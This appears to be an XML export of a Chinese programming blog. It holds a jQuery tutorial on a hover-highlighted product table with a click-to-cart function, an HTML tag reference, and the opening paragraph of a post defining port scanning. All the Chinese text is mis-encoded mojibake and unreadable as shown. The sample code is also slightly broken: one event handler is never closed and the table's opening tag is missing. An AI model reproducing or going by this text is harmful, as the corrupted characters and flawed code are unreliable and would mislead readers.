å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ç”¨åˆ°çš„å°±æ˜¯targetå±æ€§ï¼Œevent.targetæŒ‡çš„å°±æ˜¯è§¦å‘mouseoveräº‹ä»¶çš„DOMå…ƒç´ ï¼Œåœ¨è¿™é‡Œå°±æ˜¯tdã€‚ æ‰€ä»¥åœ¨å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¾—åˆ°äº†é¼ æ ‡æ‰€åœ¨çš„å…ƒç´ ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘æ¥è¯´ä¸€ä¸‹æˆ‘ä»¬è·å¾—çš„è¿™ä¸ªDOMå¯¹è±¡ã€‚ åœ¨Jqueryä¸­ï¼Œæœ‰å¯¹htmlæ“ä½œçš„ä¸€äº›å‡½æ•°ï¼Œæ¯”å¦‚$(xx).html()ï¼Œè·å–æŸå…ƒç´ å†…çš„å†…å®¹ã€‚è€Œåœ¨å•çº¯çš„javascriptä¸­ï¼Œä¹Ÿæœ‰å¯¹htmlæ“ä½œçš„DOMå‡½æ•°ï¼Œæ¯”å¦‚xx.innerHTMLï¼Œå®ƒä¹Ÿæ˜¯è·å–æŸå…ƒç´ ä¸­çš„å†…å®¹ã€‚è€Œåœ¨å®é™…è¿ç”¨ä¸­ï¼Œè¿™ä¸¤ç§å‡½æ•°æ˜¯ä¸èƒ½äº’ç›¸ä½¿ç”¨çš„ã€‚æ¯”å¦‚æˆ‘ä»¬ä¸€ä¸ªJqueryå¯¹è±¡ï¼š$(â€œdiv#testâ€)ï¼Œå®ƒä¸èƒ½ç”¨$(&quot;div#test&quot;).innerHTMLæ¥è·å–å†…å®¹ï¼Œåªèƒ½ç”¨$(&quot;div#test&quot;).html()æ¥è·å–ã€‚ åŒæ ·çš„ï¼Œå¯¹äºDOMå¯¹è±¡event.targetï¼Œä¹Ÿæ˜¯ä¸èƒ½ä½¿ç”¨Jqueryçš„æ–¹æ³•çš„ã€‚æ¯”å¦‚ï¼Œæœ‰çš„åŒå­¦ç›´æ¥ä½¿ç”¨event.target.css(&#39;background-color&#39;,&#39;red&#39;)ï¼Œæƒ³è¿™æ ·æ›´æ”¹å®ƒçš„èƒŒæ™¯é¢œè‰²ã€‚è¿™æ ·æµè§ˆå™¨æ˜¯ä¼šæŠ¥é”™çš„ï¼Œé”™è¯¯æ˜¯tdå¯¹è±¡ä¸å«æœ‰cssæ–¹æ³•ã€‚ æ‰€ä»¥å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯DOMä¸­çš„æ–¹æ³•event.target.parentNode.style.backgroundColorï¼Œé¦–å…ˆç”¨parentNodeè·å¾—tdå…ƒç´ çš„çˆ¶å…ƒç´ trå…ƒç´ ï¼ˆå› ä¸ºæˆ‘æ˜¯è¦ä¸€è¡Œéƒ½æ”¹å˜é¢œè‰²ï¼Œè€Œä¸æ˜¯åªè®©é¼ æ ‡æ‰€åœ¨çš„æ ¼å­æ”¹å˜é¢œè‰²ï¼‰ï¼Œå†ç”¨styleå±æ€§ï¼Œæ”¹å˜trå…ƒç´ çš„æ ·å¼ã€‚è¿™é‡Œè¯´ä¸€ä¸‹ï¼Œstyleä¸‹é¢æœ‰å¾ˆå¤šå±æ€§ï¼Œæ¯”å¦‚è¿™é‡Œçš„backgroundColoræ˜¯æŒ‡cssä¸­çš„&#39;background-color&#39;ï¼Œä¸€èˆ¬éƒ½æ˜¯cssä¸­çš„åå­—ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå•è¯é¦–å­—æ¯å˜æˆå¤§å†™ã€‚ æ‰€ä»¥è¿™å¥è¯ä¹Ÿå°±æ˜¯æ”¹å˜äº†trçš„æ ·å¼ï¼Œå°†cssä¸­çš„background-coloræ”¹æˆ#F0FFFFã€‚ ç¬¬äºŒä¸ªå‡½æ•°ä¹Ÿä¸€æ ·ï¼Œmouseoutæ–¹æ³•æ˜¯æŒ‡â€œé¼ æ ‡ç¦»å¼€â€ï¼Œå¦‚æœé¼ æ ‡ç§»å¼€ï¼Œå°±æŠŠé¢œè‰²æ”¹å›ä»¥å‰çš„é¢œè‰²ã€‚è¿™æ ·å°±å®Œæˆäº†æˆ‘ä»¬è¿™ä¸ªâ€œå˜è‰²è¡¨æ ¼â€çš„åˆ¶ä½œã€‚ ä¸€ä¸ªé€‰æ‹©å•†å“ç³»ç»Ÿ æˆ‘ä»¬ç»§ç»­æ¥å¼ºåŒ–åˆšæ‰åˆ¶ä½œçš„è¿™ä¸ªè¡¨æ ¼ã€‚ &lt;html&gt; &lt;head&gt; &lt;title&gt;è¡¨æ ¼1&lt;/title&gt; &lt;style&gt; table.hovertable { font-size:13px; color:#333333; border-width: 1px; border-color: #999999; border-collapse: collapse; width: 100%; } table.hovertable th { background-color:#c3dde0; border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; text-align: left; } table.hovertable tr { background-color:#d4e3e5; } table.hovertable td { border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; } &lt;/style&gt; &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;.hovertable td&quot;).mouseover(function(event){ event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;; }); $(&quot;.hovertable td&quot;).mouseout(function(event){ event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;; $(&quot;.hovertable td&quot;).click(function(event){ var name = $(event.target.parentNode).children(&quot;td:first&quot;).html(); var price = $(event.target.parentNode).children(&quot;td:last&quot;).html(); $(event.target.parentNode).remove(); $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;å…ƒ&lt;/p&gt;&apos;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;tr&gt;&lt;th width=&quot;40%&quot;&gt;å•†å“&lt;/th&gt;&lt;th width=&quot;40%&quot;&gt;ç±»åˆ«&lt;/th&gt;&lt;th&gt;ä»·æ ¼&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;è‚¥çš‚&lt;/td&gt;&lt;td&gt;æ—¥ç”¨å“&lt;/td&gt;&lt;td&gt;5.5&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;æ‹–æŠŠ&lt;/td&gt;&lt;td&gt;æ¸…æ´ç”¨å“&lt;/td&gt;&lt;td&gt;25.0&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;ç¡¬ç›˜&lt;/td&gt;&lt;td&gt;ç”µå­äº§å“&lt;/td&gt;&lt;td&gt;450.0&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;é…¸å¥¶&lt;/td&gt;&lt;td&gt;å¥¶åˆ¶å“&lt;/td&gt;&lt;td&gt;9.9&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;è‹¹æœ&lt;/td&gt;&lt;td&gt;æ°´æœ&lt;/td&gt;&lt;td&gt;2.5&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;div id=&quot;buy&quot; style=&quot;border: 1px solid #999;margin-top: 10px;text-align: center;&quot;&gt; &lt;h4 style=&quot;color: red;&quot;&gt;è´­ç‰©è½¦&lt;/h4&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; å¤§å®¶è¿è¡Œåå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡æˆ‘åšäº†ä¸€ä¸ªç±»ä¼¼ç½‘ä¸Šè´­ç‰©æ—¶é€‰è´­å•†å“çš„é¡µé¢ï¼š æ¯ç‚¹å‡»ä¸€ä¸ªå•†å“ï¼Œæˆ‘ä»¬å°±æŠŠè¿™ä¸€è¡Œä»è¡¨æ ¼ä¸­åˆ é™¤ï¼Œå¹¶åŠ åˆ°ä¸‹æ–¹çš„â€œè´­ç‰©è½¦â€æ¡†ä¸­ã€‚å…¶å®æ”¹åŠ¨å¹¶ä¸å¤§ï¼Œè¡¨æ ¼è¿˜æ˜¯åˆšæ‰çš„è¡¨æ ¼ï¼ŒJqueryä¸­å¢åŠ äº†ä¸€ä¸ªå‡½æ•°ï¼š $(&quot;.hovertable td&quot;).click(function(event){ var name = $(event.target.parentNode).children(&quot;td:first&quot;).html(); var price = $(event.target.parentNode).children(&quot;td:last&quot;).html(); $(event.target.parentNode).remove(); $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;å…ƒ&lt;/p&gt;&apos;); }); å°±æ˜¯ä¸€ä¸ªå½“æŸä¸ªæ ¼å­è¢«ç‚¹å‡»æ—¶ï¼Œæ‰§è¡Œçš„ä»£ç ã€‚çœ‹ç¬¬ä¸€è¡Œï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œevent.target.parentNodeæˆ‘è®¤è¯†ï¼Œä½†ä¸ºä»€ä¹ˆè¦æŠŠå®ƒæ”¾åœ¨$()ä¸­é—´ï¼Ÿ è¿™å°±æ¶‰åŠåˆ°DOMå¯¹è±¡è½¬æ¢æˆJqueryå¯¹è±¡çš„è¿‡ç¨‹ã€‚å¤§å®¶ç”¨Jqueryå¤šäº†å°±ä¼šå–œæ¬¢Jqueryçš„ç®€æ´ï¼Œä½†DOMå¯¹è±¡å¹¶ä¸èƒ½ä½¿ç”¨Jqueryçš„æ–¹æ³•ï¼Œæ‰€ä»¥Jqueryå…¶å®ç»™äº†å¤§å®¶ä¸€ä¸ªæ–¹å¼ï¼Œèƒ½æŠŠDOMå¯¹è±¡è½¬æ¢æˆJqueryå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æŠŠDOMå¯¹è±¡ç›´æ¥æ”¾åˆ°$()ä¸­å³å¯ã€‚ æ¯”å¦‚æˆ‘ä»¬ä¸€èˆ¬å†™çš„$(document).readyï¼Œå…¶å®å°±æ˜¯æŠŠDOMå¯¹è±¡documentè½¬æ¢æˆäº†Jqueryå¯¹è±¡ï¼Œä½¿ç”¨Jqueryçš„æ–¹æ³•readyã€‚ è¿™é‡Œä¹Ÿä¸€æ ·ï¼ŒæŠŠevent.target.parentNodeè½¬æ¢æˆäº†Jqueryçš„å¯¹è±¡ã€‚åé¢ä¸€ä¸ªchildrenå…¶å®æ˜¯Jqueryä¸‹æˆ‘æ²¡è®²åˆ°çš„â€œéå†å‡½æ•°â€ã€‚éå†å‡½æ•°å…¶å®å°±æ˜¯éå†æŸä¸ªå¯¹è±¡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä¸€ä¸ªtableå¯¹è±¡ï¼Œè¦å–å…¶ä¸­æ¯è¡Œçš„å†…å®¹ï¼Œå°±å¯ä»¥ç”¨eachæ–¹æ³•éå†ã€‚ childrenæ–¹æ³•ç”¨çš„ä¹Ÿå¾ˆå¤šï¼Œæ„æ€æ˜¯å–æ»¡è¶³æ¡ä»¶çš„æŸå­å…ƒç´ ã€‚å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œchildren(â€œtd:firstâ€)ï¼Œå°±æ˜¯å–ç¬¬ä¸€ä¸ªtdå…ƒç´ ã€‚ä¹Ÿå°±æ˜¯è¿™ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªæ ¼å­ï¼Œå†ç”¨html()å–åˆ°å…¶å†…å®¹ï¼Œä¿å­˜åˆ°å˜é‡nameé‡Œã€‚ var price = $(event.target.parentNode).children(&quot;td:last&quot;).html();ä¹Ÿæ˜¯ä¸€ä¸ªé“ç†ï¼Œå–æœ€åä¸€ä¸ªæ ¼å­å†…å®¹ã€‚ äºæ˜¯è¿™é‡Œå°±å¾—åˆ°äº†æˆ‘ç‚¹å‡»çš„è¿™ä¸€è¡Œçš„å•†å“åå’Œä»·æ ¼ã€‚ç„¶åç”¨$(event.target.parentNode).remove();æŠŠè¿™ä¸€è¡Œç§»é™¤ï¼Œå†ç”¨appendæŠŠå†…å®¹åŠ åˆ°â€œè´­ç‰©è½¦â€é‡Œã€‚å°±åˆ¶æˆäº†è¿™ä¸ªç®€å•çš„é€‰è´­å•†å“çš„é¡µé¢ã€‚ æœ¬æ–‡å†…å®¹è½¬è‡ªï¼šç¦»åˆ«æ­Œ]]></content>
      <tags>
        <tag>å‰ç«¯</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>JQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTMLå­¦ä¹ ç¬”è®°]]></title>
    <url>%2F2016%2F08%2F26%2FHTML%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼Œæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ä¸‹çš„ä¸€ä¸ªåº”ç”¨ã€‚â€œè¶…æ–‡æœ¬â€å°±æ˜¯æŒ‡é¡µé¢å†…å¯ä»¥åŒ…å«å›¾ç‰‡ã€é“¾æ¥ï¼Œç”šè‡³éŸ³ä¹ã€ç¨‹åºç­‰éæ–‡å­—å…ƒç´ ã€‚è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€çš„ç»“æ„åŒ…æ‹¬â€œå¤´â€éƒ¨åˆ†ï¼ˆè‹±è¯­ï¼šHeadï¼‰ã€å’Œâ€œä¸»ä½“â€éƒ¨åˆ†ï¼ˆè‹±è¯­ï¼šBodyï¼‰ï¼Œå…¶ä¸­â€œå¤´â€éƒ¨æä¾›å…³äºç½‘é¡µçš„ä¿¡æ¯ï¼Œâ€œä¸»ä½“â€éƒ¨åˆ†æä¾›ç½‘é¡µçš„å…·ä½“å†…å®¹ã€‚ HTMLå­¦ä¹ ç¬”è®° HTML å¸¸ç”¨æ ‡ç­¾æ¼”ç¤º æœ¬é¡µæ¼”ç¤ºçš„æ‰€æœ‰æ ‡ç­¾å‡ä¸ºæµè§ˆå™¨é»˜è®¤æ•ˆæœã€‚ã€åŸºç¡€ã€‘&lt;div&gt; å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚ï¼ˆå—å…ƒç´ ï¼Œæ— ä»»ä½•å±æ€§ï¼‰&lt;span&gt; å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚ï¼ˆå†…è”å…ƒç´ ï¼Œæ— ä»»ä½•å±æ€§ï¼‰&lt;h1&gt; to &lt;h6&gt; å®šä¹‰æ ‡é¢˜ï¼ˆé€šå¸¸ä½¿ç”¨ç²—ä½“æ˜¾ç¤ºã€‚æ³¨æ„ï¼šå•ä¸ªé¡µé¢å†…æœ€å¥½åªä½¿ç”¨1ä¸ªH1æ ‡ç­¾ï¼‰H1 æ ‡é¢˜H2 æ ‡é¢˜H3 æ ‡é¢˜H4 æ ‡é¢˜H5 æ ‡é¢˜H6 æ ‡é¢˜&lt;p&gt; å®šä¹‰æ®µè½&lt;hr&gt; å®šä¹‰æ°´å¹³çº¿ï¼ˆæœ¬é¡µä¸­çš„åˆ†å‰²çº¿å‡ä¸º &lt;hr&gt; æ ‡ç­¾ï¼‰&lt;header&gt; å®šä¹‰ section æˆ–é¡µé¢çš„å¤´éƒ¨&lt;footer&gt; å®šä¹‰ section æˆ–é¡µé¢çš„å°¾éƒ¨&lt;article&gt; å®šä¹‰æ–‡ç« &lt;section&gt; å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚&lt;aside&gt; å®šä¹‰æ–‡æ¡£å†…å®¹ç›¸å…³çš„å†…å®¹&lt;nav&gt; å®šä¹‰å¯¼èˆªheader å¤´éƒ¨footer å°¾éƒ¨article å†…å®¹section å†…å®¹aside å†…å®¹nav å†…å®¹&lt;details&gt; å®šä¹‰ç»†èŠ‚å†…å®¹&lt;summary&gt; å®šä¹‰ details çš„æ ‡é¢˜All pages and graphics on this web site are the property of W3School.HTML 5This document teaches you everything you have to learn about HTML 5.ã€åˆ—è¡¨ã€‘&lt;ul&gt; å®šä¹‰æ— åºåˆ—è¡¨ï¼ˆé€šå¸¸åˆ—è¡¨å‰ä¼šæœ‰é¡¹ç›®ç¬¦å·ï¼‰ &lt;li&gt; å®šä¹‰åˆ—è¡¨çš„é¡¹ç›® å¼ ä¸‰ æå››&lt;ol&gt; å®šä¹‰æœ‰åºåˆ—è¡¨ã€‚ï¼ˆé€šå¸¸åˆ—è¡¨å‰ä¼šæœ‰æ•°å­—ç¬¦å·ï¼‰ &lt;li&gt; å®šä¹‰åˆ—è¡¨çš„é¡¹ç›® å¼ ä¸‰ æå››&lt;dl&gt; å®šä¹‰å®šä¹‰åˆ—è¡¨ &lt;dt&gt; å®šä¹‰å®šä¹‰åˆ—è¡¨ä¸­çš„é¡¹ç›® &lt;dd&gt; å®šä¹‰å®šä¹‰åˆ—è¡¨ä¸­é¡¹ç›®çš„æè¿° CFç©¿è¶Šç«çº¿ CFæ˜¯ä¸€ä¸ªå¾ˆå¥½ç©çš„æ¸¸æˆå•Šï¼Œä¸€èˆ¬äººç©ä¸äº†..ã€è¡¨æ ¼ã€‘&lt;table&gt; å®šä¹‰è¡¨æ ¼&lt;caption&gt; å®šä¹‰è¡¨æ ¼æ ‡é¢˜&lt;thead&gt; å®šä¹‰è¡¨æ ¼ä¸­çš„è¡¨å¤´å†…å®¹&lt;tfoot&gt; å®šä¹‰è¡¨æ ¼ä¸­çš„è¡¨æ³¨å†…å®¹ï¼ˆè„šæ³¨ï¼‰&lt;tbody&gt; å®šä¹‰è¡¨æ ¼ä¸­çš„ä¸»ä½“å†…å®¹&lt;tr&gt; å®šä¹‰è¡¨æ ¼ä¸­çš„è¡Œ&lt;th&gt; å®šä¹‰è¡¨æ ¼ä¸­çš„è¡¨å¤´å•å…ƒæ ¼ï¼ˆé€šå¸¸ä½¿ç”¨ç²—ä½“æ˜¾ç¤ºï¼‰&lt;td&gt; å®šä¹‰è¡¨æ ¼ä¸­çš„å•å…ƒ table ç»“æ„æ ‡å‡†é¡ºåºå¦‚ä¸‹ï¼š&lt;table&gt; &lt;caption&gt;&lt;/caption&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tfoot&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;â€» è™½ç„¶ tfoot æ”¾åœ¨äº† tbody ä¹‹å‰ï¼Œæµè§ˆå™¨ä¾ç„¶ä¼šå°† tfoot æ˜¾ç¤ºåœ¨ tbody ä¹‹åï¼Œè€Œä¸”è¿™æ ·åšèƒ½è®©æµè§ˆå™¨åœ¨è·å¾—æ‰€æœ‰è¡¨æ ¼å†…çš„æ•°æ®å‰æ˜¾ç¤ºè¡¨æ³¨ã€‚ è¡¨æ ¼æ ‡é¢˜ è¡¨å¤´ ID è¡¨å¤´ å§“å è¡¨å¤´ æ—¥æœŸ è¡¨æ³¨ è¿™æ˜¯ç¼–å· è¡¨æ³¨ è¿™æ˜¯å‡å è¡¨æ³¨ è¿™æ˜¯æ·»åŠ æ—¥æœŸ 1 å¼ ä¸‰ 2019-09-09 2 æå›› 2016-6-6 è‡ªå¸¦è¾¹æ¡†æ ·å¼ è¡¨å¤´ ID è¡¨å¤´ å§“å è¡¨å¤´ æ—¥æœŸ è¡¨æ³¨ è¿™æ˜¯ç¼–å· è¡¨æ³¨ è¿™æ˜¯å‡å è¡¨æ³¨ è¿™æ˜¯æ·»åŠ æ—¥æœŸ 1 å¼ ä¸‰ 20019-09-09 2 æå›› 2016-6-6 ã€è¡¨å•ã€‘ &lt;form&gt; å®šä¹‰è¡¨å•&lt;fieldset&gt; å®šä¹‰å›´ç»•è¡¨å•ä¸­å…ƒç´ çš„è¾¹æ¡†ï¼ˆé€šå¸¸å››å‘¨ä¼šæœ‰ç¼©è¿›ï¼Œå¹¶æ˜¾ç¤ºå›´ç»•çš„è¾¹æ¡†ï¼‰&lt;legend&gt; å®šä¹‰ fieldset å…ƒç´ çš„æ ‡é¢˜ æ ‡é¢˜ å†…å®¹&lt;select&gt; å®šä¹‰é€‰æ‹©åˆ—è¡¨ï¼ˆä¸‹æ‹‰åˆ—è¡¨ã€å¤šé€‰åˆ—è¡¨ï¼‰&lt;optgroup&gt; å®šä¹‰é€‰æ‹©åˆ—è¡¨ä¸­ç›¸å…³é€‰é¡¹çš„ç»„åˆ&lt;option&gt; å®šä¹‰é€‰æ‹©åˆ—è¡¨ä¸­çš„é€‰é¡¹ å¼ ä¸‰ å¼ ä¸‰çš„å„¿å­ å¼ ä¸‰çš„å­™å¥³ æå›› æå››çš„å¥³å„¿ æå››çš„å­™å­ æ»šåŠ¨åˆ—è¡¨å½¢å¼ å¼ ä¸‰ å¼ ä¸‰çš„å„¿å­ å¼ ä¸‰çš„å­™å¥³ æå›› æå››çš„å¥³å„¿ æå››çš„å­™å­ å¤šé€‰åˆ—è¡¨ å¼ ä¸‰ å¼ ä¸‰çš„å„¿å­ å¼ ä¸‰çš„å­™å¥³ æå›› æå››çš„å¥³å„¿ æå››çš„å­™å­ &lt;input&gt; å®šä¹‰è¾“å…¥æ§ä»¶ï¼ˆå¦‚æœæµè§ˆå™¨ä¸æ”¯æŒ HTML5 æ–°çš„ç±»å‹ï¼Œé‚£ä¹ˆä¼šä½¿ç”¨æ–‡æœ¬åŸŸæ›¿ä»£ï¼‰æ–‡æœ¬åŸŸ type=â€textâ€ å¯†ç åŸŸ type=â€passwordâ€ å¤é€‰æ¡† type=â€checkboxâ€ A B Cå•é€‰æŒ‰é’® type=â€radioâ€ ç»„A:â‘  â‘¡ ç»„B:â…  â…¡æ–‡ä»¶åŸŸ type=â€fileâ€ å›¾åƒåŸŸ type=â€imageâ€ ï¼ˆå¯ç”¨åšæäº¤æŒ‰é’®ï¼‰éšè—åŸŸ type=â€hiddenâ€ ï¼ˆå½“ç„¶æ˜¯çœ‹ä¸è§çš„äº†ï¼‰æ™®é€šæŒ‰é’® type=â€buttonâ€ é‡ç½®æŒ‰é’® type=â€resetâ€ æäº¤æŒ‰é’® type=â€submitâ€ email åŸŸ type=â€emailâ€ ï¼ˆè‹¥æœ‰è¾“å…¥å†…å®¹ï¼Œåˆ™ä¼šéªŒè¯æ ¼å¼æ˜¯å¦ç¬¦åˆ emailï¼‰url åŸŸ type=â€urlâ€ ï¼ˆè‹¥æœ‰è¾“å…¥å†…å®¹ï¼Œåˆ™ä¼šéªŒè¯æ ¼å¼æ˜¯å¦ç¬¦åˆ urlï¼‰æ•°å€¼åŸŸ type=â€numberâ€ ï¼ˆè‹¥æœ‰è®¾ç½®æœ€å¤§å€¼æˆ–æœ€å°å€¼ï¼Œåˆ™ä¼šéªŒè¯æ•°å­—æ˜¯å¦åœ¨æœ€å¤§æœ€å°å€¼ä¹‹å†…ï¼‰æ•°å€¼èŒƒå›´åŸŸ type=â€rangeâ€ ï¼ˆé€šè¿‡æ‹–åŠ¨æ»‘å—æ¥é€‰æ‹©æ•°å€¼ï¼‰æ—¥æœŸåŸŸ type=â€dateâ€ ï¼ˆä¼šè°ƒç”¨æµè§ˆå™¨è‡ªå¸¦çš„æ—¥æœŸé€‰æ‹©å™¨ï¼Œå¯è®¾ç½®çš„ç±»å‹ï¼šdate, month, week, time, datetime, datetime-localï¼‰ type=â€monthâ€ type=â€weekâ€ type=â€timeâ€ type=â€datetimeâ€ type=â€datetime-localâ€ è‰²å€¼åŸŸ type=â€colorâ€ ï¼ˆä¼šè°ƒç”¨æµè§ˆå™¨è‡ªå¸¦çš„é¢œè‰²é€‰æ‹©å™¨ï¼‰æœç´¢åŸŸ type=â€searchâ€ ï¼ˆç”¨äºæœç´¢ï¼Œç«™å†…æœç´¢æˆ– Google æœç´¢ç­‰ï¼Œåœ¨è¾“å…¥æ¡†å†…å®¹å³ä¾§é€šå¸¸ä¼šå‡ºç°æ¸…é™¤æŒ‰é’®ï¼‰&lt;datalist&gt; å®šä¹‰ input å…ƒç´ çš„é€‰é¡¹åˆ—è¡¨ &lt;keygen&gt; å®šä¹‰ç”Ÿæˆç§˜é’¥&lt;output&gt; å®šä¹‰å¤šè¡Œçš„æ–‡æœ¬è¾“å…¥æ§ä»¶&lt;label&gt; å®šä¹‰ input å…ƒç´ çš„æ ‡æ³¨ç‚¹å‡»è¿™é‡Œä¹Ÿå¯ä»¥é€‰ä¸­&lt;textarea&gt; å®šä¹‰å¤šè¡Œçš„æ–‡æœ¬è¾“å…¥æ§ä»¶&lt;button&gt; å®šä¹‰æŒ‰é’®ï¼ˆä¸ input ä¸åŒçš„æ˜¯ï¼Œbutton å†…éƒ¨å¯ä»¥æ”¾ç½®æ›´å¤šçš„å†…å®¹ï¼Œæ¯”å¦‚æ–‡æœ¬æˆ–å›¾åƒï¼‰ æ™®é€šæŒ‰é’® é‡ç½®æŒ‰é’® æäº¤æŒ‰é’®ã€æ ¼å¼ã€‘&lt;blockquote&gt; å®šä¹‰é•¿çš„å¼•ç”¨ï¼ˆé€šå¸¸å››å‘¨ä¼šæœ‰ç¼©è¿›ï¼‰WEBæ ‡å‡†ä¸æ˜¯æŸä¸€ä¸ªæ ‡å‡†ï¼Œè€Œæ˜¯ä¸€ç³»åˆ—æ ‡å‡†çš„é›†åˆã€‚ç½‘é¡µä¸»è¦ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šç»“æ„ï¼ˆStructureï¼‰ã€è¡¨ç°ï¼ˆPresentationï¼‰å’Œè¡Œä¸ºï¼ˆBehaviorï¼‰ã€‚å¯¹åº”çš„æ ‡å‡†ä¹Ÿåˆ†ä¸‰æ–¹é¢ï¼šç»“æ„åŒ–æ ‡å‡†è¯­è¨€ä¸»è¦åŒ…æ‹¬XHTMLå’ŒXMLï¼Œè¡¨ç°æ ‡å‡†è¯­è¨€ä¸»è¦åŒ…æ‹¬CSSï¼Œè¡Œä¸ºæ ‡å‡†ä¸»è¦åŒ…æ‹¬å¯¹è±¡æ¨¡å‹ï¼ˆå¦‚W3C DOMï¼‰ã€ECMAScriptç­‰ã€‚è¿™äº›æ ‡å‡†å¤§éƒ¨åˆ†ç”±W3Cèµ·è‰å’Œå‘å¸ƒï¼Œä¹Ÿæœ‰ä¸€äº›æ˜¯å…¶ä»–æ ‡å‡†ç»„ç»‡åˆ¶è®¢çš„æ ‡å‡†ï¼Œæ¯”å¦‚ECMAï¼ˆEuropean Computer Manufacturers Associationï¼‰çš„ECMAScriptæ ‡å‡†ã€‚&lt;pre&gt; å®šä¹‰é¢„æ ¼å¼æ–‡æœ¬ï¼ˆé€šå¸¸ä¼šä¿ç•™ç©ºæ ¼åŠæ¢è¡Œç¬¦ï¼Œå¹¶ä½¿ç”¨ç­‰å®½å­—ä½“æ˜¾ç¤ºï¼Œå¾ˆé€‚åˆç”¨æ¥è¡¨ç¤ºè®¡ç®—æœºä»£ç ï¼‰for(var i=0; i]]></content>
      <tags>
        <tag>å‰ç«¯</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonå®ç°ç«¯å£æ‰«æ]]></title>
    <url>%2F2016%2F08%2F24%2FPython%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[ç«¯å£æ‰«æç«¯å£æ‰«æå·¥å…·ï¼ˆPort Scannerï¼‰æŒ‡ç”¨äºæ¢æµ‹æœåŠ¡å™¨æˆ–ä¸»æœºå¼€æ”¾ç«¯å£æƒ…å†µçš„å·¥å…·ã€‚å¸¸è¢«è®¡ç®—æœºç®¡ç†å‘˜ç”¨äºç¡®è®¤å®‰å…¨ç­–ç•¥ï¼ŒåŒæ—¶è¢«æ”»å‡»è€…ç”¨äºè¯†åˆ«ç›®æ ‡ä¸»æœºä¸Šçš„å¯è¿ä½œçš„ç½‘ç»œæœåŠ¡ã€‚ç«¯å£æ‰«æå®šä¹‰æ˜¯å®¢æˆ·ç«¯å‘ä¸€å®šèŒƒå›´çš„æœåŠ¡å™¨ç«¯å£å‘é€å¯¹åº”è¯·æ±‚ï¼Œä»¥æ­¤ç¡®è®¤å¯ä½¿ç”¨çš„ç«¯å£ã€‚è™½ç„¶å…¶æœ¬èº«å¹¶ä¸æ˜¯æ¶æ„çš„ç½‘ç»œæ´»åŠ¨ï¼Œä½†ä¹Ÿæ˜¯ç½‘ç»œæ”»å‡»è€…æ¢æµ‹ç›®æ ‡ä¸»æœºæœåŠ¡ï¼Œä»¥åˆ©ç”¨è¯¥æœåŠ¡çš„å·²çŸ¥æ¼æ´çš„é‡è¦æ‰‹æ®µã€‚ç«¯å£æ‰«æçš„ä¸»è¦ç”¨é€”ä»ç„¶åªæ˜¯ç¡®è®¤è¿œç¨‹æœºå™¨æŸä¸ªæœåŠ¡çš„å¯ç”¨æ€§ã€‚æ‰«æå¤šä¸ªä¸»æœºä»¥è·å–ç‰¹å®šçš„æŸä¸ªç«¯å£è¢«ç§°ä¸ºç«¯å£æ¸…æ‰«ï¼ˆPortsweepï¼‰ï¼Œä»¥æ­¤è·å–ç‰¹å®šçš„æœåŠ¡ã€‚ä¾‹å¦‚ï¼ŒåŸºäºSQLæœåŠ¡çš„è®¡ç®—æœºè •è™«å°±ä¼šæ¸…æ‰«å¤§é‡ä¸»æœºçš„åŒä¸€ç«¯å£ä»¥åœ¨ 1433 ç«¯å£ä¸Šå»ºç«‹TCPè¿æ¥ã€‚ 